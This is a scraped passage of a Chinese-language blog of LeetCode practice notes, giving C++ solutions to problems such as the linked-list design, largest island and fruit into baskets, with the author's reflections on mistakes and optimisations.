vector&lt;vector&lt;int&gt;&gt;&amp; pieces) { int arr_map[105] = {0}; int len_arr = arr.size(); for(int i = 0; i &lt; len_arr; i++) { arr_map[arr[i]] = i+1; } int pie_len = pieces.size(); for(int i = 0; i &lt; pie_len; i++) { int i_len = pieces[i].size(); int diff = arr_map[pieces[i][0]]; if(diff == 0) { return false; } for(int j = 1; j &lt; i_len; j++) { if(diff != arr_map[pieces[i][j]] - j) { return false; } } } return true; }}; 4ms，和最快的思路刚好相反，用map存储arr的index，最快的思路是反过来，用map存一个piece的第一个index 123456789101112131415161718192021222324class Solution {public: bool canFormArray(vector&lt;int&gt;&amp; arr, vector&lt;vector&lt;int&gt;&gt;&amp; pieces) { int arr_map[105] = {0}; int len_arr = arr.size(); int pie_len = pieces.size(); for(int i = 0; i &lt; pie_len; i++) { arr_map[pieces[i][0]] = i+1; } int i = 0; while(i &lt; len_arr) { int row = arr_map[arr[i]]; if(row == 0) return false; vector&lt;int&gt;&amp; subv = pieces[row-1]; int i_len = subv.size(); for(int j = 0; j &lt; i_len; j++, i++) { if(arr[i] != subv[j]) { return false; } } } return true; }}; 707. 设计链表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273struct List { List *next; int val; List(int val0, List* next0 = nullptr):val(val0), next(next0) {}};class MyLinkedList {private: List *root; List *tail; int size; inline List* getNode(int&amp; index) { List *move = root; while(index &gt; 0 &amp;&amp; move-&gt;next != nullptr) { move = move-&gt;next; index--; } return move; }public: MyLinkedList() { root = new List(0); tail = root; size = 0; } int get(int index) { List *move = getNode(index); return (move-&gt;next == nullptr) ? -1 : move-&gt;next-&gt;val; } void addAtHead(int val) { List* node = new List(val, root-&gt;next); root-&gt;next = node; if(root == tail) { tail = node; } size++; } void addAtTail(int val) { List* node = new List(val, tail-&gt;next); tail-&gt;next = node; tail = node; size++; } void addAtIndex(int index, int val) { List *move = getNode(index); if(index &gt; 0) { return; } List* node = new List(val, move-&gt;next); move-&gt;next = node; if(move == tail) { tail = node; } size++; } void deleteAtIndex(int index) { List *move = getNode(index); List *target = move-&gt;next; if(target != nullptr) { move-&gt;next = target-&gt;next; if(target == tail) { tail = move; } delete target; size--; } }}; 60ms -&gt; 36ms 之前内部函数getNode有两个参数，第二个参数off用于返回index和找到的节点的距离差距。将这个参数优化掉，维护一个size替代。 1652. 拆炸弹12345678910111213141516171819202122232425262728293031323334353637class Solution {public: vector&lt;int&gt; decrypt(vector&lt;int&gt;&amp; code, int k) { int len = code.size(); if(k &gt; 0) { vector&lt;int&gt; after(len, 0); for(int i = 0; i &lt; k; i++) { after[0] += code[(i+1)%len]; } for(int i = 1; i &lt; len; i++) { if(i + k &lt; len) { after[i] = after[i-1] - code[i] + code[(i+k)]; } else { after[i] = after[i-1] - code[i] + code[(i+k)- len]; } // cout &lt;&lt; (i+k+1)%len &lt;&lt; &quot; &quot; &lt;&lt; code[(i+k)%len] &lt;&lt; endl; } return after; } if(k &lt; 0) { vector&lt;int&gt; before(len, 0); for(int i = 0; i &lt; -k; i++) { before[0] += code[(i + k + len)%len]; } for(int i = 1; i &lt; len; i++) { if ((i -1 + k) &gt;= 0) { before[i] = before[i-1] - code[(i -1 + k)] + code[i-1]; } else { before[i] = before[i-1] - code[(i -1 + k + len)] + code[i-1]; } // cout &lt;&lt; (i+k+len)%len &lt;&lt; endl; } return before; } return vector&lt;int&gt;(len, 0); }}; 4ms -&gt; 0ms 之前使用取余达到题目所说的“循环数组”的效果，后来看题解上直接把数组copy一份，创建一个2n长的数组避免越界。这里不取余，越界后直接加或减去数组长度。 788. 旋转数字123456789101112131415161718192021222324252627class Solution {public: int rotatedDigits(int n) { int goodDigits[10] = {0, 1, 5, -1, -1, 2, 9, -1, 8, 6}; int count = 0; for(int i = 1; i &lt;= n; i++) { bool flag1 = false; bool flag2 = false; int cur_i = i; while(cur_i != 0) { int mod = cur_i % 10; if(goodDigits[mod] != mod) { flag1 = true; } if(goodDigits[mod] == -1) { flag2 = true; } cur_i /= 10; } if(flag1 &amp;&amp; !flag2) { count++; // printf(&quot;%d, &quot;, i); } } return count; }}; 第一次提交没有注意读题，数字的每一位都要能反转，且至少有一位反转后与原来不同，导致逻辑错误。 面试题 17.19. 消失的两个数字12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061class Solution {public: vector&lt;int&gt; missingTwo(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int a = -1,b = -1; for(int i = 0; i &lt; len; i++) { while(nums[i] - 1 != i &amp;&amp; nums[i] != -1) { if(nums[i]-1 == len) { swap(nums[i], a); } else if(nums[i]-1 == len+1) { swap(nums[i], b); } else { swap(nums[i], nums[nums[i] - 1]); } } } while(a - 1 != len &amp;&amp; a != -1) { if(a-1 == len) { swap(a, a); } else if(a-1 == len+1) { swap(a, b); } else { swap(a, nums[a - 1]); } } while(b - 1 != len+1 &amp;&amp; b != -1) { if(b-1 == len) { swap(b, a); } else if(b-1 == len+1) { swap(b, b); } else { swap(b, nums[b - 1]); } } vector&lt;int&gt; ret(2); int count = 0; for(int i = 0; i &lt; len; i++) { if(nums[i] - 1 != i) { ret[count] = i+1; count++; if(count &gt;= 2) break; } } if(count &lt; 2 &amp;&amp; a-1 != len) { ret[count] = len+1; count++; } if(count &lt; 2 &amp;&amp; b-1 != len) { ret[count] = len+2; count++; } return ret; } void inline swap(int &amp;a, int &amp;b) { int temp = a; a = b; b = temp; }}; 之前做过类似的题目，数字是1 - N，就把他们一直交换，数字N就放到位置N，直到当前循环计数变量i的位置对应的数字和i相同或为-1 注意到参数传入的数组只有N-2的长度，而题目要求使用空间O(1)的原地算法，创建两个变量a, b并赋初值为-1，分别作为原来数组的延长，遇到这两个位置时进行特殊判断。 后来看代码的时候发现第48行的判断写错了，应该是count &lt; 2 &amp;&amp; b-1 != len+1，但是代码依旧通过测试了，看来测试样例还是不够全。 面试题 01.02. 判定是否互为字符重排123456789101112131415161718class Solution {public: bool CheckPermutation(string s1, string s2) { int len = s1.size(); if(len != s2.size()) return false; int m1[26] = {0}, m2[26] = {0}; for(int i = 0; i &lt; len; i++) { m1[s1[i]-'a']++; m2[s2[i]-'a']++; } for(int i = 0; i &lt; 26; i++) { if(m1[i] != m2[i]) { return false; } } return true; }}; 简单题，直接统计字母频率就好 面试题 17.09. 第 k 个数123456789101112131415161718192021222324252627class Solution {public: int getKthMagicNumber(int k) { vector&lt;int&gt; kth(k); int p1,p2,p3; p1 = p2 = p3 = 0; kth[0] = 1; for(int i = 1; i &lt; k; i++) { int a, b,c; // printf(&quot;%d %d %d %d\\n&quot;, p1, p2, p3, i); a = kth[p1] * 3; b = kth[p2] * 5; c = kth[p3] * 7; kth[i] = min(a, min(b,c)); if(kth[i] == a) { p1++; } if(kth[i] == b) { p2++; } if(kth[i] == c) { p3++; } } return kth[k-1]; }}; 比较难，尝试了很多次，最后看题解才写出来。 刚开始想先用素数筛算出足够的素数，再利用素数数组，从1，3，5，7之后开始，所有的非素数奇数中一个个筛选出不含有除3，5，7外其他素数的数。但是后来发现这样会超时，样例输入251时需要350万个素数，光是算素数就已经超时了。 最后才用了题解的dp，每次算出一个，如果是乘3就把3的指针向后移，5和7同理，这样就可以逐个由小到大算出第k个数。 面试题 01.09. 字符串轮转12345678910111213141516171819202122class Solution {public: bool isFlipedString(string s1, string s2) { int len = s1.size(); int i = 0; if(len == 0) return true; for(i; i &lt; len; i++) { bool flag = true; for(int j = 0; j &lt; len; j++) { if(s1[(i+j)%len] != s2[j]) { flag = false; break; } } if(flag) { return true; } } return false; }}; 最开始暴力直接搜，看了题解后可以构造string s = s1 + s1，然后使用kmp搜索s中是否有s2子串 面试题 01.08. 零矩阵1234567891011121314151617181920212223242526272829class Solution {public: void setZeroes(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) { int m = matrix.size(); if(m &lt;= 0) return; int n = matrix[0].size(); vector&lt;bool&gt; r(m, false), c(n, false); // bool r[10000] = {false}, c[10000] = {false}; for(int i = 0; i &lt; m; i++) { for(int j = 0; j &lt; n; j++) { if(matrix[i][j] == 0) { r[i] = true; c[j] = true; } } } for(int i = 0; i &lt; m; i++) { for(int j = 0; j &lt; n; j++) { if(r[i]) { matrix[i][j] = 0; } if(c[j]) { matrix[i][j] = 0; } } } }}; 简单题，直接记录某行某列是否有0，然后根据每行每列的flag更新就好了 1694. 重新格式化电话号码1234567891011121314151617181920212223242526272829303132class Solution {public: string reformatNumber(string number) { string ret; int len = number.size(); int count_n = 0; int count = 0; for(int i = 0; i &lt; len; i++) { if(number[i] &gt;= '0' &amp;&amp; number[i] &lt;= '9') { ret.push_back(number[i]); count++; if(count%3 == 0) { ret.push_back('-'); } count_n = count%3; } } // printf(&quot;%d %d\\n&quot;, count_n, count); if(count_n == 0) { ret.pop_back(); } else if(count_n == 1 &amp;&amp; count &gt;= 3) { int off = count / 3; count += off; char t = ret[count-2]; ret[count-2] = ret[count-3]; ret[count-3] = t; // printf(&quot;%c %c\\n&quot;, ret[count-2], ret[count-3]); } return ret; }}; 简单题，第一次提交时忘记之前添加过字符-,想通过最后余数对结尾4个的字符的情况进行特殊处理，直接用字符的计数器count忘记加上添加的-的个数 777. 在LR字符串中交换相邻字符12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364class Solution {public: int len; bool canTransform(string start, string end) { int i,j = 0; int len = start.size(); if(end.size() != len) { return false; } char t[10005] = {0}; int t_i = 0; for(char c: start) { if(c != 'X') { t[t_i] = c; t_i++; } } int t_len = t_i; t_i = 0; for(char c : end) { if(c == 'X') { continue; } if(t_i &lt; t_len &amp;&amp; c == t[t_i]) { t_i++; } else { return false; } } if(t_i != t_len) return false; while(j &lt; len) { if(end[j] == 'L') { int it = j; while(it &lt; len &amp;&amp; start[it] == 'X') { it++; } if(it &lt; len &amp;&amp; start[it] == 'L') { char temp_c = start[it]; start[it] = start[j]; start[j] = temp_c; } else { return false; } } else if(end[j] == 'R') { int it = j; while(it &gt;= 0 &amp;&amp; start[it] == 'X') { it--; } if(it &gt;= 0 &amp;&amp; start[it] == 'R') { char temp_c = start[it]; start[it] = start[j]; start[j] = temp_c; } else { return false; } } else { } j++; } return j == len &amp;&amp; start[j-1] == end[len-1]; }}; 比较难 第一次的思路是直接忽略X，比较L和R的序列是否相同，这个显然是没有完全考虑完全 第二次打算进行搜索，生成所有左移右移后的情况，和end进行对比，但是没有考虑到L，R可以多次移动，L多次移动的话就要进行多次的回溯，非常麻烦 第三次真正理解题意，根据end对start进行移动，在结合第一次的思路比较一下忽略X的LR序列是否完全相同。 1784. 检查二进制字符串字段1234567891011121314class Solution {public: bool checkOnesSegment(string s) { int count = 0; int i = 0; int length = s.size(); while(i &lt; length) { while(i &lt; length &amp;&amp; s[i] == '1') i++; count++; while(i &lt; length &amp;&amp; s[i] == '0') i++; } return count &lt;= 1; }}; 简单，有手就行，就是统计有几群连续的1 921. 使括号有效的最少添加12345678910111213141516171819class Solution {public: int minAddToMakeValid(string s) { stack&lt;char&gt; sta; int count = 0; for(char c : s) { if(c == '(') { sta.push(c); } else { if(sta.empty()) { count++; } else { sta.pop(); } } } return count + sta.size(); }}; 题目的样例好像有错误还是我没看懂，总之是括号匹配，问有几个不匹配的 每次出现右括号且没有左括号匹配时，计数器++，字符串变量结束后，在加上栈中剩余的没匹配的左括号的个数就好了。 811. 子域名访问计数12345678910111213141516171819202122232425262728293031class Solution {public: vector&lt;string&gt; subdomainVisits(vector&lt;string&gt;&amp; cpdomains) { unordered_map&lt;string, int&gt; m; for(string&amp; s : cpdomains) { char domain[105] = {0}; int num; sscanf(s.c_str(), &quot;%d %s&quot;, &amp;num, domain); int length = strlen(domain); int i = 0; m[domain] +=num; while(i &lt; length) { while(i &lt; length &amp;&amp; domain[i] != '.') i++; if(i &gt;= length) break; char subdomain[105] = {0}; for(int j = 0; j &lt; length - i - 1; j++) { subdomain[j] = domain[i+1+j]; } m[subdomain] += num; i++; } } vector&lt;string&gt; v; for(unordered_map&lt;string, int&gt;::iterator i = m.begin(); i != m.end(); i++) { char str[105] = {0}; sprintf(str, &quot;%d %s&quot;, i-&gt;second, i-&gt;first.c_str()); v.push_back(str); } return v; }}; 比较简单，找个map统计每个域名的出现个数就行，然后从左往右找.，找到后拿到子串，map中统计所有子串的出现个数。","link":"/home/2022/10/22/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9313/"},{"title":"LeetCode-14","text":"927. 三等分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class Solution {public: vector&lt;int&gt; threeEqualParts(vector&lt;int&gt;&amp; arr) { int sum = countOne(arr); int len = arr.size(); if(sum % 3 != 0) { return {-1,-1}; } if(sum == 0) { return {0, len -1}; } int p1,p2,p3; p1 = p2 = p3 = 0; int i = 0; int cur = 0; while(i &lt; len) { if(arr[i] == 1) { if(cur == 0) { p1 = i; } else if(cur == sum/3) { p2 = i; } else if(cur == 2*sum/3) { p3 = i; } cur++; } i++; } //把1平均分成3份，p1 p2 p3分别找到三段的第一个1的位置 // printf(&quot;%d %d %d\\n&quot;, p1, p2, p3); int x = p1,y = p2,z = p3; int farclen = len - p3; if(p1 + farclen &gt; p2 || p2 + farclen &gt; p3) { return {-1, -1}; } while(x &lt; p2 &amp;&amp; y &lt; p3 &amp;&amp; z &lt; len) { if(arr[x] != arr[y] || arr[y] != arr[z]) { return {-1, -1}; } x++;y++;z++; } // printf(&quot;%d %d %d\\n&quot;, x, y, z); return {p1+farclen-1, p2+farclen}; } int countOne(vector&lt;int&gt;&amp; arr) { int count = 0; for(int a : arr) { count += a; } return count; }}; 难，看懂解析思路后才写出来的 刚开始的思路是找0，把1分成了n段，取n/3 , 2n/3和 n段后面的0，然后向右移动双指针比较 后来发现有超级长的输入，超时了 解析的思路与我刚好相反，先数1的个数，如果是0或者不能被3整除，说明不能分成三段 1的个数为n，找到第0 n/3 2n/3个1，记为p1, p2, p3 p3到后末尾的长度就是三个子串的长度，如果p1 或 p2 + 字串长度分别大于p2 p3，说明无解 然后向后比较，若后面的数完全相同则有解 1636. 按照频率将数组升序排序123456789101112131415161718192021222324class Solution {public: vector&lt;int&gt; frequencySort(vector&lt;int&gt;&amp; nums) { int freq[205] = {0}; for(int v : nums) { freq[100+v]++; } int invfreq[205][205] = {0}; int count[205] = {0}; for(int i = 0; i &lt; 205; i++) { invfreq[freq[i]][count[freq[i]]++] = i-100; } int numsc = 0; for(int i = 1; i &lt; 205; i++) { for(int j = count[i]-1; j &gt;= 0; j--) { //printf(&quot;%d %d\\n&quot;, i, invfreq[i][j]); for(int k = 0; k &lt; i; k++) { nums[numsc++] = invfreq[i][j]; } } } return nums; }}; 简单，但是还是错了几次（没认真读题，没发现同频率的要降序排列） 先用map计算每个数字的出现次数，hash为100+i 再把map做倒排索引，由于hash是100+i，那么倒排后的索引也自然以升序排好序了 根据倒排索引进行输出。 1624. 两个相同字符之间的最长子字符串1234567891011121314151617181920212223242526class Solution {public: int maxLengthBetweenEqualCharacters(string s) { int left[26] = {0}; int right[26] = {0}; int len = s.size(); for(int i = 0; i &lt; len; i++) { if(left[s[i]-'a'] == 0) { left[s[i]-'a'] = i+1; } } for(int i = len-1; i &gt;= 0; i--) { if(right[s[i]-'a'] == 0) { right[s[i]-'a'] = i+1; } } int max = 0; int flag = false; for(int i = 0; i &lt; 26; i++) { int x = right[i] - left[i] - 1; max = max &gt; x ? max : x; if(x+1 &gt; 0) flag = true; } return flag ? max : -1; }}; 简单，数一下每个字母第一次出现的位置和最后一次出现的位置，相减-1取最大值，再对不存在的情况进行特殊标记，也就是所有字母第一次出现的位置和最后一次出现的位置全都相同的情况 827. 最大人工岛优化到最短的代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758class Solution { int indexMap[505][505] = {0}; //岛屿点，对应一个岛 int areaMap[505*505] = {0}; //岛屿点，对应一个岛 int n; const vector&lt;int&gt; d = {0, -1, 0, 1, 0};public: int largestIsland(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { n = grid.size(); int islandCount = 0; int max2area = 0; for(int i = 0; i &lt; n; i++) { for(int j = 0; j &lt; n; j++) { if(grid[i][j] == 1) { if(indexMap[i][j] == 0) { indexMap[i][j] == ++islandCount; dfs(grid, i, j, islandCount); max2area = max2area &gt; areaMap[islandCount] ? max2area : areaMap[islandCount]; } } } } for(int i = 0; i &lt; n; i++) { for(int j = 0; j &lt; n; j++) { unordered_set&lt;int&gt; neighbour; int areai = 1; if(grid[i][j] == 0) { for(int k = 0; k &lt; 4; k++) { if(valid(i, j , k) &amp;&amp; grid[i + d[k]][j + d[k+1]] == 1) { if(neighbour.count(indexMap[i + d[k]][j + d[k+1]]) == 0) { areai += areaMap[indexMap[i + d[k]][j + d[k+1]]]; neighbour.insert(indexMap[i + d[k]][j + d[k+1]]); } } } max2area = max2area &gt; areai ? max2area : areai; } } } return max2area; } bool valid(int i, int j, int k) { int x = i + d[k]; int y = j + d[k+1]; return x &gt;= 0 &amp;&amp; y &gt;= 0 &amp;&amp; x &lt; n &amp;&amp; y &lt; n; } void dfs(vector&lt;vector&lt;int&gt;&gt;&amp; grid, int x, int y, int index) { if(indexMap[x][y] != 0) return; indexMap[x][y] = index; areaMap[index]++; for(int k = 0; k &lt; 4; k++) { if(valid(x, y, k) &amp;&amp; grid[x + d[k]][y + d[k+1]] == 1) { dfs(grid, x + d[k], y + d[k+1], index); } } }}; 但是这样效率特别低，主要是valid函数太低下了 不用valid12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273class Solution {private: int indexMap[505][505] = {0}; //岛屿点，对应一个岛 int areaMap[505*505] = {0}; //岛屿点，对应一个岛 int n;public: int largestIsland(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { n = grid.size(); int islandCount = 0; bool find0 = false; bool find1 = false; for(int i = 0; i &lt; n; i++) { for(int j = 0; j &lt; n; j++) { if(grid[i][j] == 1) { find1 = true; if(indexMap[i][j] == 0) { ++islandCount; indexMap[i][j] == islandCount; dfs(grid, i, j, islandCount); } } else { find0 = true; } } } int max2area = 0; if(!find0 &amp;&amp; find1) return n*n; if(find0 &amp;&amp; !find1) return 1; for(int i = 0; i &lt; n; i++) { for(int j = 0; j &lt; n; j++) { set&lt;int&gt; neighbour; int areai = 1; if(grid[i][j] == 0) { if(j-1 &gt;= 0 &amp;&amp; grid[i][j-1] == 1) { neighbour.insert(indexMap[i][j-1]); } if(i-1 &gt;= 0 &amp;&amp; grid[i-1][j] == 1) { neighbour.insert(indexMap[i-1][j]); } if(j+1 &lt; n &amp;&amp; grid[i][j+1] == 1) { neighbour.insert(indexMap[i][j+1]); } if(i+1 &lt; n &amp;&amp; grid[i+1][j] == 1) { neighbour.insert(indexMap[i+1][j]); } for(set&lt;int&gt;::iterator ite = neighbour.begin(); ite != neighbour.end(); ite++) { areai += areaMap[*ite]; } max2area = max2area &gt; areai ? max2area : areai; } } } return max2area; } void dfs(vector&lt;vector&lt;int&gt;&gt;&amp; grid, int x, int y, int index) { if(indexMap[x][y] != 0) return; indexMap[x][y] = index; areaMap[index]++; if(y-1 &gt;= 0 &amp;&amp; grid[x][y-1] == 1) { dfs(grid, x, y-1, index); } if(y+1 &lt; n &amp;&amp; grid[x][y+1] == 1) { dfs(grid, x, y+1, index); } if(x+1 &lt; n &amp;&amp; grid[x+1][y] == 1) { dfs(grid, x+1, y, index); } if(x-1 &gt;= 0 &amp;&amp; grid[x-1][y] == 1) { dfs(grid, x-1, y, index); } }}; 首次通过的代码，比较冗长123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110class Solution {private: struct Island { int area; int index; Island(int a, int i):area(a), index(i) {} }; bool edgeMap[505][505]; //边界点，对应的哪个岛 Island* islandMap[505][505]; //岛屿点，对应一个岛 // vector&lt;Island*&gt; allIsland; //方便回收内存 int n;public: int largestIsland(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { n = grid.size(); int island_count = 0; bool find0 = false; bool find1 = false; for(int i = 0; i &lt; n; i++) { for(int j = 0; j &lt; n; j++) { if(grid[i][j] == 1) { find1 = true; Island *island = nullptr; if(islandMap[i][j] == nullptr) { island = new Island(0, island_count++); dfs(grid, i, j, island); } else { island = islandMap[i][j]; } if(j-1 &gt;= 0 &amp;&amp; grid[i][j-1] == 0) { edgeMap[i][j-1] = true; } if(i-1 &gt;= 0 &amp;&amp; grid[i-1][j] == 0) { edgeMap[i-1][j] = true; } } else { find0 = true; Island *island = nullptr; if(j-1 &gt;= 0 &amp;&amp; grid[i][j-1] == 1) { edgeMap[i][j] = true; } if(i-1 &gt;= 0 &amp;&amp; grid[i-1][j] == 1) { edgeMap[i][j] = true; } } } } // int max_area = 0; int max2area = 0; if(!find0 &amp;&amp; find1) return n*n; if(find0 &amp;&amp; !find1) return 1; for(int i = 0; i &lt; n; i++) { for(int j = 0; j &lt; n; j++) { set&lt;Island*&gt; neighbour; int areai = 1; if(edgeMap[i][j]) { if(j-1 &gt;= 0 &amp;&amp; grid[i][j-1] == 1) { Island *island = islandMap[i][j-1]; neighbour.insert(island); } if(i-1 &gt;= 0 &amp;&amp; grid[i-1][j] == 1) { Island *island = islandMap[i-1][j]; neighbour.insert(island); } if(j+1 &lt; n &amp;&amp; grid[i][j+1] == 1) { Island *island = islandMap[i][j+1]; neighbour.insert(island); } if(i+1 &lt; n &amp;&amp; grid[i+1][j] == 1) { Island *island = islandMap[i+1][j]; neighbour.insert(island); } for(set&lt;Island*&gt;::iterator ite = neighbour.begin(); ite != neighbour.end(); ite++) { areai += (*ite)-&gt;area; } max2area = max2area &gt; areai ? max2area : areai; } } } return max2area; // return max_area &gt; max2area ? max_area : max2area; } void addDot(int x, int y) { edgeMap[x][y] = true; } void dfs(vector&lt;vector&lt;int&gt;&gt;&amp; grid, int x, int y, Island *island) { if(islandMap[x][y] != nullptr) return; islandMap[x][y] = island; island-&gt;area++; // printf(&quot;add %p x=%d y=%d, area=%d\\n&quot;, island, x, y, island-&gt;area); if(y-1 &gt;= 0 &amp;&amp; grid[x][y-1] == 1) { dfs(grid, x, y-1, island); } if(y+1 &lt; n &amp;&amp; grid[x][y+1] == 1) { dfs(grid, x, y+1, island); } if(x+1 &lt; n &amp;&amp; grid[x+1][y] == 1) { dfs(grid, x+1, y, island); } if(x-1 &gt;= 0 &amp;&amp; grid[x-1][y] == 1) { dfs(grid, x-1, y, island); } }}; 写了很久，其实和题解的思路是一模一样的","link":"/home/2022/10/22/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9314/"},{"title":"LeetCode-15","text":"904. 水果成篮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Solution {public: int totalFruit(vector&lt;int&gt;&amp; fruits) { int len = fruits.size(); vector&lt;int&gt; v(len); int i = 0; int cur = fruits[i]; i++; int max_diff = 1; int typea = fruits[0], typeb = -1, typec = -1; vector&lt;int&gt; last(len+1); int curr = 0; int j = 1; while(j &lt; len) { while(j &lt; len &amp;&amp; fruits[j] == fruits[curr]) { j++; } last[j] = curr; curr = j; j++; } while(i &lt; len) { int diff = 1; typeb = typec = -1; while(i &lt; len) { if(fruits[i] != typea &amp;&amp; fruits[i] != typeb) { if(typeb == -1) { typeb = fruits[i]; } else if(typec == -1) { typec = fruits[i]; } } if(typec == -1) { diff++; } else { break; } i++; } max_diff = diff &gt; max_diff ? diff : max_diff; if(i-1 &gt;= 0 &amp;&amp; i &lt; len){ typea = fruits[i-1]; i = last[i]+1; } } return max_diff; }}; 想法很简单，就是从左往右遍历，数当前遇到了几种水果，当遇到第三种水果后，更新一下装入水果的最大值，三种水果记录为typea, typeb, typec然后回溯，找到前一个节点在左侧最后一个typea后第一次出现的位置（其实也是typea最后出现的位置的后两个位置） 优化(空间，放弃last数组)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Solution {public: int totalFruit(vector&lt;int&gt;&amp; fruits) { int len = fruits.size(); vector&lt;int&gt; v(len); int i = 0; int cur = fruits[i]; i++; int max_diff = 1; int typea = fruits[0], typeb = -1, typec = -1; while(i &lt; len) { int diff = 1; typeb = typec = -1; int lasta = i-1, lastb = 0; while(i &lt; len) { if(fruits[i] != typea &amp;&amp; fruits[i] != typeb) { if(typeb == -1) { typeb = fruits[i]; } else if(typec == -1) { typec = fruits[i]; } } if(fruits[i] == typea) { lasta = i; } else if(fruits[i] == typeb) { lastb = i; } if(typec == -1) { diff++; } else { break; } i++; } max_diff = diff &gt; max_diff ? diff : max_diff; if(i-1 &gt;= 0 &amp;&amp; i &lt; len){ if(fruits[i-1] == typea) { i = lastb + 2; } else if(fruits[i-1] == typeb) { typea = typeb; i = lasta + 2; } // printf(&quot;%d, %d, %d\\n&quot;, i, lasta, lastb); } } return max_diff; }}; 1441. 用栈操作构建数组1234567891011121314151617181920class Solution {public: vector&lt;string&gt; buildArray(vector&lt;int&gt;&amp; target, int n) { int cur = 0; int len = target.size(); vector&lt;string&gt; ret; for(int i = 0; i &lt; len; i++) { int diff = target[i] - cur; cur = target[i]; if(diff &gt; 1) { for(int j = 0; j &lt; diff-1; j++) { ret.push_back(&quot;Push&quot;); ret.push_back(&quot;Pop&quot;); } } ret.push_back(&quot;Push&quot;); } return ret; }}; 优化，使用emplace_back()push_back()方法要调用构造函数和复制构造函数，这也就代表着要先构造一个临时对象，然后把临时的copy构造函数拷贝或者移动到容器最后面。而emplace_back()在实现时，则是直接在容器的尾部创建这个元素，省去了拷贝或移动元素的过程。 123456789101112131415161718class Solution {public: vector&lt;string&gt; buildArray(vector&lt;int&gt;&amp; target, int n) { int cur = 0; int len = target.size(); vector&lt;string&gt; ret; for(int i = 0; i &lt; len; i++) { int diff = target[i] - cur - 1; cur = target[i]; for(int j = 0; j &lt; diff; j++) { ret.emplace_back(&quot;Push&quot;); ret.emplace_back(&quot;Pop&quot;); } ret.emplace_back(&quot;Push&quot;); } return ret; }}; 769. 最多能完成排序的块1234567891011121314151617class Solution {public: int maxChunksToSorted(vector&lt;int&gt;&amp; arr) { int count = 0; int len = arr.size(); int maxx = 0; for(int i = 0; i &lt; len; i++) { if(arr[i] &gt;= maxx) { maxx = arr[i]; } if(maxx == i) { count++; } } return count; }}; 如果在找到下一个最大值之前，当前最大值能找到最大位置，则存在一个组 940. 不同的子序列 IIcomming soon 902. 最大为 N 的数字组合123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657class Solution {public: vector&lt;int&gt; digitscount; int len; int bit; int hasdigit[10] = {0}; int atMostNGivenDigitSet(vector&lt;string&gt;&amp; digits, int n) { digitscount = vector&lt;int&gt;(11); string nstr = toString(n); bit = nstr.size(); len = digits.size(); for(int i = 0; i &lt; len; i++) { hasdigit[digits[i][0]-'0']=1; } digitscount[digits[0][0]-'0'+1]++; for(int i = 1; i &lt; len; i++) { for(int j = digits[i-1][0]-'0'+1; j &lt;= digits[i][0]-'0'; j++) { digitscount[j+1] = digitscount[j]; } digitscount[digits[i][0]-'0'+1]++; } for(int i = digits[len-1][0]-'0'+1; i &lt; 10; i++) { digitscount[i+1] = digitscount[i]; } int count = 0; if(len == 1) { count = bit-1; } else { count = len*(1-pow(len, bit-1))/(1-len); } return count + cal(bit-1, digits, nstr); } int cal(int i, vector&lt;string&gt;&amp; digits, string&amp; nstr) { if(i &lt; 0) return 1; int x = digitscount[nstr[i]-'0']; return x*pow(len, i) + hasdigit[nstr[i]-'0']*cal(i-1, digits, nstr); } long long pow(long long x, long long n) { long long res = 1; while(n) { if(n&amp;1){ res *= x; } n /= 2; x *= x; } return res; } string toString(int n) { string ret = &quot;&quot;; while(n) { ret.push_back(n%10 + '0'); n/=10; } return ret; }}; 思想很简单，首先有n个数字可以用，每个数字使用次数不限，所以求指数目标数字是n位数，那么任意的1位数到n-1位数的任意组合都是可以使用的对于n位数的情况，逐次考虑每一位，对于第i位， 若第i位使用的数字小于目标数字的第i位，后面的数字可以任意组合 若第i位使用的数字等于目标数字的第i位（前提是digits数组中有这个数），则 $ 1 \\times (第i+1位) $ 的情况 两种情况之和就是结果 需要注意的是，pow使用long long防止结果溢出 优化 避免反复使用pow函数 当hasdigit已经是0了，无需后续计算 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960class Solution {public: vector&lt;int&gt; digitscount; int len; int bit; int hasdigit[10] = {0}; int atMostNGivenDigitSet(vector&lt;string&gt;&amp; digits, int n) { digitscount = vector&lt;int&gt;(11); string nstr = toString(n); bit = nstr.size(); len = digits.size(); for(int i = 0; i &lt; len; i++) { hasdigit[digits[i][0]-'0']=1; } digitscount[digits[0][0]-'0'+1]++; for(int i = 1; i &lt; len; i++) { for(int j = digits[i-1][0]-'0'+1; j &lt;= digits[i][0]-'0'; j++) { digitscount[j+1] = digitscount[j]; } digitscount[digits[i][0]-'0'+1]++; } for(int i = digits[len-1][0]-'0'+1; i &lt; 10; i++) { digitscount[i+1] = digitscount[i]; } int count = 0; if(len == 1) { count = bit-1; } else { count = len*(1-pow(len, bit-1))/(1-len); } return count + cal(bit-1, digits, nstr, pow(len, bit-1)); } int cal(int i, vector&lt;string&gt;&amp; digits, string&amp; nstr, int power) { if(i &lt; 0) return 1; int x = digitscount[nstr[i]-'0']; if(hasdigit[nstr[i]-'0'] == 0) { return x*power; } return x*power + hasdigit[nstr[i]-'0']*cal(i-1, digits, nstr, power/len); } long long pow(long long x, long long n) { long long res = 1; while(n) { if(n&amp;1){ res *= x; } n /= 2; x *= x; } return res; } string toString(int n) { string ret = &quot;&quot;; while(n) { ret.push_back(n%10 + '0'); n/=10; } return ret; }}; 快速幂算法： 从代码反推可知，实际上把n看作二进制数 